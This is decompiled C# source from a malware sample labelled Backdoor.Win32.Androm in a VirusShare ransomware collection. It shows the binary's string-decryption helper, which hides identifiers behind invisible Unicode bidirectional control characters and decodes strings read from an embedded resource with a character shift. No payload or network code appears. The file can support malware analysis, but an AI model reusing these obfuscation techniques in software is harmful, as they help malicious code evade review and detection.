// Decompiled with JetBrains decompiler
// Type: ‬‭‫‮‪‬‭‮‪
// Assembly: aEJ6jTE, Version=1.0.1503.580, Culture=neutral, PublicKeyToken=9019a33760589f5c
// MVID: 0E0402B9-2401-4AAE-96E6-76FB4CC98595
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Backdoor.Win32.Androm.hdrc-c472378b06a51717aa2bd050f9217819f08f17b4ef64da8fd12dbcdcd0491df4.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

internal static class \u202C‭‫‮‪‬‭‮‪
{
  private static Dictionary<int, byte[]> encryptedBytes = new Dictionary<int, byte[]>();

  static \u202C‭‫‮‪‬‭‮‪()
  {
    using (BinaryReader binaryReader = new BinaryReader(typeof (\u202C‭‫‮‪‬‭‮‪).Assembly.GetManifestResourceStream("\u202C\u202E\u202B\u202C\u202E\u202C\u202B\u202B\u202E\u202E\u202D\u202B\u202B\u202A")))
    {
      ushort num = binaryReader.ReadUInt16();
      for (int index = 0; index < (int) num; ++index)
      {
        int count = (int) binaryReader.ReadUInt16();
        int key = binaryReader.ReadInt32();
        byte[] numArray = binaryReader.ReadBytes(count);
        \u202C‭‫‮‪‬‭‮‪.encryptedBytes.Add(key, numArray);
      }
    }
  }

  private static string \u202B‪‭‬‮‮‭‮‫‮(string text, string key)
  {
    string str = (string) null;
    int num1 = key.Length * 12;
    char[] charArray = text.ToCharArray();
    for (int index = 0; index < text.Length; ++index)
    {
      int num2 = (int) charArray[index] - num1;
      str += (string) (object) (char) num2;
    }
    if (str == null)
      str = "";
    return str;
  }

  internal static string \u202D‪‪‬‪‪(int a, int b) => \u202C‭‫‮‪‬‭‮‪.\u202B‪‭‬‮‮‭‮‫‮(Encoding.UTF8.GetString(\u202C‭‫‮‪‬‭‮‪.encryptedBytes[a + b]), Encoding.ASCII.GetString(BitConverter.GetBytes(b)));
}
